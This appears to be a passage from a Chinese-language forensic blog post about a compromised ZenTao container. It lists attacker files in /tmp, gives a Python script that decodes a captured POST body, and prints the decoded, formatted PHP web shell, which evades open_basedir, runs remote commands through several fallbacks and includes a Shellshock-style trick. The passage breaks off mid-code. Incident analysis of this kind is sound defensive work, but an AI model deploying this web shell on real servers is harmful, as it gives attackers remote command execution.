+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">total 22972</span><br><span class="line">drwxrwxrwt 1 root   root        4096 May  7 13:20 .</span><br><span class="line">drwxr-xr-x 1 root   root        4096 Feb 19 11:12 ..</span><br><span class="line">drwxr-xr-x 2 nobody nogroup     4096 May  7 13:35 .1</span><br><span class="line">-rw-r--r-- 1 nobody nogroup      674 Apr 16 14:47 .32915ant_x64.so</span><br><span class="line">-rw-r--r-- 1 nobody nogroup    11565 Apr 21 11:34 12.txt</span><br><span class="line">-rw-r--r-- 1 nobody nogroup    18911 Apr 23 17:27 192b.txt</span><br><span class="line">-rw-r--r-- 1 nobody nogroup    81209 May  2 16:55 22.txt</span><br><span class="line">drwxr-xr-x 3 nobody nogroup     4096 Apr 16 17:36 CVE-2021-22555-Exploit</span><br><span class="line">-rw-rw---- 1 nobody nogroup       56 Apr 15 20:35 adminer.invalid</span><br><span class="line">-rw-rw---- 1 nobody nogroup      401 Apr 20 12:21 adminer.version</span><br><span class="line">-rwxr-xr-x 1 nobody nogroup 10137752 Feb 23 01:32 cdk_linux_386</span><br><span class="line">-rwxrwxrwx 1 nobody nogroup  7100304 Apr 16 16:59 fs</span><br><span class="line">-rw-r--r-- 1 nobody nogroup      268 Apr 16 14:47 gconv-modules</span><br><span class="line">-rw-r--r-- 1    501 staff      15236 Jul 11  2024 package.xml</span><br><span class="line">-rw------- 1 nobody nogroup    44113 Apr 23 10:54 phpx2lUxr</span><br><span class="line">-rw-r--r-- 1 nobody nogroup    36381 Apr 20 17:20 result.txt</span><br><span class="line">-rwxr-xr-x 1 nobody nogroup  4903024 Apr 20 16:00 rustscan</span><br><span class="line">-rwxr-xr-x 1 nobody nogroup     1047 Apr 22 14:28 scanb.sh</span><br><span class="line">-rw-r--r-- 1 root   root           0 Feb 19 11:13 sentry.log</span><br><span class="line">-rwxr-xr-x 1 nobody nogroup  1106480 Oct 13  2023 slix</span><br></pre></td></tr></table></figure>
+
+<h3 id="可疑文件分析"><a href="#可疑文件分析" class="headerlink" title="可疑文件分析"></a>可疑文件分析</h3><p>zentao_hacked(容器 zentao 改名来的) 容器内执行 <code>stat /tmp/phpx2lUxr</code> 的输出： </p>
+<blockquote>
+<p>  File: &#x2F;tmp&#x2F;phpx2lUxr<br>  Size: 44113     	Blocks: 88         IO Block: 4096   regular file<br>Device: 5eh&#x2F;94d	Inode: 2374031     Links: 1<br>Access: (0600&#x2F;-rw——-)  Uid: (65534&#x2F;  nobody)   Gid: (65534&#x2F; nogroup)<br>Access: 2025-05-07 13:05:27.412000000 +0800<br>Modify: 2025-04-23 10:54:16.944000000 +0800<br>Change: 2025-04-23 10:54:16.944000000 +0800<br> Birth: 2025-04-23 10:54:16.944000000 +0800</p>
+</blockquote>
+<p><code>/tmp/phpx2lUxr</code> 文件太大，就不列内容了，但这是一个非常重要的文件，我们来分析一下这个文件吧</p>
+<p>再弄个 python 程序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phpx2lUxr&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分 key=value</span></span><br><span class="line"><span class="keyword">for</span> pair <span class="keyword">in</span> data.split(<span class="string">&#x27;&amp;&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> pair:</span><br><span class="line">        key, value = pair.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 先 URL 解码</span></span><br><span class="line">        value_decoded = urllib.parse.unquote(value)</span><br><span class="line">        <span class="comment"># 尝试 base64 解码</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = base64.b64decode(value_decoded).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="comment"># 如果解码后有明显 PHP 代码特征</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&lt;?php&#x27;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&#x27;base64_decode&#x27;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Key: <span class="subst">&#123;key&#125;</span>\nDecoded:\n<span class="subst">&#123;decoded&#125;</span>\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a.py</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>Key: bd87898bcbf27d<br>Decoded:<br>@ini_set(“display_errors”, “0”);@set_time_limit(0);$opdir&#x3D;@ini_get(“open_basedir”);if($opdir) {$ocwd&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$oparr&#x3D;preg_split(base64_decode(“Lzt8Oi8&#x3D;”),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir&#x3D;$item.”&#x2F;.dd4073a3309”;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir&#x3D;realpath($tmdir);@chdir($tmdir);@ini_set(“open_basedir”, “..”);$cntarr&#x3D;@preg_split(“&#x2F;\\|/&#x2F;“,$tmdir);for($i&#x3D;0;$i&lt;sizeof($cntarr);$i++){@chdir(“..”);};@ini_set(“open_basedir”,”&#x2F;“);@rmdir($tmdir);break;};};;function asenc($out){return @base64_encode($out);};function asoutput(){$output&#x3D;ob_get_contents();ob_end_clean();echo “67”.”035”;echo @asenc($output);echo “031”.”531”;}ob_start();try{$p&#x3D;base64_decode(substr($_POST[“h82ad1117a8e69”],2));$s&#x3D;base64_decode(substr($_POST[“h51d3ad7f0190a”],2));$envstr&#x3D;@base64_decode(substr($_POST[“pb5f3a839543ad”],2));$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;”&#x2F;“?”-c &quot;{$s}&quot;“:”&#x2F;c &quot;{$s}&quot;“;if(substr($d,0,1)&#x3D;&#x3D;”&#x2F;“){@putenv(“PATH&#x3D;”.getenv(“PATH”).”:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin”);}else{@putenv(“PATH&#x3D;”.getenv(“PATH”).”;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;”);}if(!empty($envstr)){$envarr&#x3D;explode(“|||asline|||”, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(“|||askey|||”, “&#x3D;”, $v));}}}$r&#x3D;”{$p} {$c}”;function fe($f){$d&#x3D;explode(“,”,@ini_get(“disable_functions”));if(empty($d)){$d&#x3D;array();}else{$d&#x3D;array_map(‘trim’,array_map(‘strtolower’,$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) &#x3D;&#x3D; “&#x2F;“ &amp;&amp; fe(‘putenv’) &amp;&amp; (fe(‘error_log’) || fe(‘mail’))) {if (strstr(readlink(“&#x2F;bin&#x2F;sh”), “bash”) !&#x3D; FALSE) {$tmp &#x3D; tempnam(sys_get_temp_dir(), ‘as’);putenv(“PHP_LOL&#x3D;() { x; }; $c &gt;$tmp 2&gt;&amp;1”);if (fe(‘error_log’)) {error_log(“a”, 1);} else {mail(“<a href="mailto:&#97;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;">&#97;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a>“, “”, “”, “-bv”);}} else {return False;}$output &#x3D; @file_get_contents($tmp);@unlink($tmp);if ($output !&#x3D; “”) {print($output);return True;}}return False;};function runcmd($c){$ret&#x3D;0;$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);if(fe(‘system’)){@system($c,$ret);}elseif(fe(‘passthru’)){@passthru($c,$ret);}elseif(fe(‘shell_exec’)){print(@shell_exec($c));}elseif(fe(‘exec’)){@exec($c,$o,$ret);print(join(“<br>“,$o));}elseif(fe(‘popen’)){$fp&#x3D;@popen($c,’r’);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(‘proc_open’)){$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(‘pipe’, ‘w’), 2 &#x3D;&gt; array(‘pipe’, ‘w’)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(‘antsystem’)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!&#x3D;”&#x2F;“ &amp;&amp; @class_exists(“COM”)){$w&#x3D;new COM(‘WScript.shell’);$e&#x3D;$w-&gt;exec($c);$so&#x3D;$e-&gt;StdOut();$ret.&#x3D;$so-&gt;ReadAll();$se&#x3D;$e-&gt;StdErr();$ret.&#x3D;$se-&gt;ReadAll();print($ret);}else{$ret &#x3D; 127;}return $ret;};$ret&#x3D;@runcmd($r.” 2&gt;&amp;1”);print ($ret!&#x3D;0)?”ret&#x3D;{$ret}”:””;;}catch(Exception $e){echo “ERROR:&#x2F;&#x2F;“.$e-&gt;getMessage();};asoutput();die();</p>
+</blockquote>
+<p>把 php 代码格式化后，得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">	<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);</span><br><span class="line">	@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.dd4073a3309&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">		<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">			@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">		&#125;;</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;67&quot;</span>.<span class="string">&quot;035&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;031&quot;</span>.<span class="string">&quot;531&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h82ad1117a8e69&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h51d3ad7f0190a&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pb5f3a839543ad&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;&#123;</span></span><br><span class="line"><span class="string">		<span class="subst">$s</span></span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">		\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;&#123;</span></span><br><span class="line"><span class="string">			<span class="subst">$s</span></span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">	@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;</span><br><span class="line">	<span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">		<span class="subst">$p</span>&#125;</span></span><br><span class="line"><span class="string">	 &#123;</span></span><br><span class="line"><span class="string">		<span class="subst">$c</span>&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;</span><br><span class="line">		<span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">			<span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">			<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123;x;&#125;;<span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">				<span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> False;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">		@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">			<span class="keyword">return</span> True;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">	<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>))&#123;</span><br><span class="line">		@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">		@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">		@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">		<span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">		<span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">		<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">			<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">		<span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">		<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">			<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span 